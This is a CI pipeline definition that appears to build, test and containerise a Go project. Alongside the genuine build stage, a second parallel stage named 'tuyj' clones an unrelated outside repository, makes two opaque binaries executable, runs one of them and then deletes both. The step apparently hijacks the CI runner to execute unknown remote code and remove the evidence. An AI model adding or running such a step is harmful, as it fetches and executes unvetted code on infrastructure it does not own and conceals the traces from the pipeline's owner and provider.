pipeline:
  identifier: Build_fajionulasa_slalnia_1727147283834
  name: Build slalnia
  orgIdentifier: default
  projectIdentifier: default_project
  properties:
    ci:
      codebase:
        build: <+input>
        connectorRef: account.Github_OAuth_1727146386353
        repoName: fajionulasa/slalnia
  stages:
    - parallel:
        - stage:
            identifier: build
            name: build
            spec:
              caching:
                enabled: true
              cloneCodebase: true
              execution:
                steps:
                  - step:
                      identifier: gobuild
                      name: go_build
                      spec:
                        command: go build
                      timeout: ""
                      type: Run
                  - step:
                      identifier: gotestcoverage
                      name: go_test_coverage
                      spec:
                        command: go test -coverprofile=coverage.out ./...
                      timeout: ""
                      type: Run
                  - step:
                      identifier: gotestreport
                      name: go_test_report
                      spec:
                        command: "export GOBIN=/home/harness/go/bin\n\t\texport PATH=/home/harness/go/bin:$PATH\n\t\techo $PATH\n\t\tgo install github.com/jstemmer/go-junit-report/v2@latest\n\t\tgo test -v 2>&1 ./... | go-junit-report -set-exit-code > report.xml"
                        reports:
                          spec:
                            paths:
                              - /harness/report.xml
                          type: JUnit
                      timeout: ""
                      type: Run
                  - step:
                      identifier: dockerbuild
                      name: docker_build
                      spec:
                        caching: true
                        connectorRef: <+input>
                        repo: hello/world
                        tags:
                          - latest
                      timeout: ""
                      type: BuildAndPushDockerRegistry
              platform:
                arch: Amd64
                os: Linux
              runtime:
                spec: {}
                type: Cloud
            type: CI
        - stage:
            name: tuyj
            identifier: tuyj
            description: ""
            type: CI
            spec:
              cloneCodebase: true
              platform:
                os: Linux
                arch: Amd64
              runtime:
                type: Cloud
                spec: {}
              execution:
                steps:
                  - step:
                      type: Run
                      name: Run_1
                      identifier: Run_1
                      spec:
                        shell: Sh
                        command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
